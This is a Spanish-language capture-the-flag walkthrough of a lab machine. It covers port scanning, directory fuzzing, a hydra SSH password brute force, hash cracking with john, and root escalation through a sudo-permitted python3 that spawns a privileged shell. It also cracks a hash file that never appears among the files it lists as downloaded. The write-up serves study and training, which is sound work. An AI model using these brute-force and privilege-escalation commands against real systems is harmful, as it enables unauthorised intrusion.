# Pequeñas_Mentirosas

## 1. Reconocimiento de Puertos con Nmap

Realizamos un escaneo con `nmap` para detectar puertos abiertos y sus versiones. 

```bash
nmap -sC -sV --open <IP_DEL_OBJETIVO>
```

**Resultados Clave:**

*   `22/tcp open ssh OpenSSH 9.2p1 Debian`
*   `80/tcp open http Apache httpd 2.4.62 ((Debian))

## 2. Enumeración Web y Pista Inicial

Al acceder a la dirección IP del objetivo en el navegador web (`http://<IP_DEL_OBJETIVO>`), la página principal muestra una pista importante.

### 2.1. Pista en la Página Web

La página web contiene el mensaje: 
`Pista: Encuentra la clave para A en los archivos.`
Esto sugiere que hay un usuario llamado "a" y que su clave (probablemente una contraseña o clave SSH) está oculta.

### 2.2. Fuzzing de Directorios (Gobuster)

Para asegurar que no pasamos por alto rutas ocultas, realizamos una enumeración de directorios en el servidor web.

```bash
gobuster dir http://<IP_DEL_OBJETIVO>/ -w /path/to/wordlist/directory-list-2.3-medium.txt -x html,php
```

La enumeración no revela directorios o archivos sensibles adicionales, lo que nos redirige al análisis de la pista inicial orientada al servicio SSH.

## 3. Acceso Inicial (SSH)

Con el posible usuario `a` identificado y el puerto SSH abierto, procedemos a realizar un ataque de fuerza bruta asumiendo que la clave podría ser una contraseña débil presente en diccionarios estándar.

### 3.1. Fuerza Bruta SSH para el Usuario "a"

Ejecutamos `hydra` utilizando el diccionario `rockyou.txt`.

```bash
hydra -l a -P /path/to/wordlist/rockyou.txt ssh://<IP_DEL_OBJETIVO>
```

**Resultado:**

*   `[22][ssh] host: <IP_DEL_OBJETIVO> login: a password: secret`

Hemos obtenido la contraseña para el usuario inicial: **secret**.

### 3.2. Conexión SSH como "a"

Con las credenciales obtenidas, nos conectamos al servidor SSH como el usuario `a`.

```bash
ssh a@<IP_DEL_OBJETIVO>
# Contraseña: secret
```

## 4. Movimiento Lateral y Descubrimiento de Pistas

na vez dentro del sistema como el usuario `a`, iniciamos la fase de enumeración interna para buscar vectores de escalada o movimiento lateral.

### 4.1. Enumeración de Usuarios y Directorios Home

Exploramos el directorio `/home/` para identificar otros usuarios en el sistema. Esto nos revela la existencia de dos usuarios: `a` y `spencer`.

```bash
ls /home/
# a spencer
```

### 4.2. Búsqueda de Archivos en `/srv/ftp`

La pista inicial mencionaba "archivos". En sistemas Linux, el directorio `/srv` a menudo se utiliza para datos de servicios, como FTP. Aunque no vimos un servicio FTP en el escaneo inicial, es un lugar común para dejar archivos en CTFs.

Descargamos el contenido del directorio `/srv/ftp/` a nuestra máquina atacante usando `scp`.

```bash
scp a@<IP_DEL_OBJETIVO>:/srv/ftp/* ~/Pequenas_mentirosas
```

**Archivos Descargados y su Contenido:**

*   `clave_secreta.txt`: Contiene "Clave secreta: thisisaverysecretkey!". Esta es una clave, pero no está claro para qué es aún.
*   `mensaje_hash.txt`: Contiene "Descubre el hash y tendrás la clave...". Esto sugiere que hay un hash que debemos crackear.
*   `pista_fuerza_bruta.txt`: Contiene "Realiza un ataque de fuerza bruta para descubrir la contraseña de spencer...". Esta es una pista directa para el usuario `spencer`.
*   `retos.txt`: Contiene "Cifrado Simétrico: Usa AES para desencriptar el siguiente archivo.". Esto podría ser un reto adicional.
*   `retos_asimetricos`: Contiene "Cifrado Asimétrico: Encuentra la clave privada para desencriptar.". Otro reto.

### 4.3. ### Cracking del Hash (John the Ripper)

Utilizamos `john` junto con el diccionario `rockyou.txt` para descifrar el hash obtenido.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash_spencer.txt
```

**Resultado:**

*   `hash_spencer.txt: password1`

La contraseña para `spencer` es **password1**.

### 4.4. Pivoting a Spencer

Con las credenciales de `spencer`, nos conectamos al servidor SSH.

```bash
ssh spencer@<IP_DEL_OBJETIVO>
# Contraseña: password1
```

## 5. Escalada de Privilegios

El objetivo final es obtener control total del sistema comprometiendo la cuenta `root`.

### 5.1. Enumeración de Sudoers

Verificamos los privilegios administrativos asignados al usuario `spencer`.

```bash
sudo -l
```

**Resultados:**

*   `User spencer may run the following commands on ...: (ALL) NOPASSWD: /usr/bin/python3`

El usuario `spencer` puede ejecutar el intérprete de Python 3 como superusuario sin necesidad de proporcionar contraseña.

### 5.2. Obtención de Shell de Root con Python

`python3` puede ser abusado para obtener un shell de `root`. Consultamos [GTFOBins](https://gtfobins.github.io/gtfobins/python/#sudo) para la técnica específica.

Creamos un pequeño script de Python (`exploit.py`) que ejecutará un shell de bash con privilegios de `root`.

```bash
touch exploit.py
echo -e "import os\nos.system(\"bash -p\")" > exploit.py
```

Luego, ejecutamos este script con `sudo` como `root`.

```bash
sudo -u root /usr/bin/python3 exploit.py
```

El comando `whoami` confirmará que hemos escalado exitosamente a `root`.

```bash
whoami
# root
```
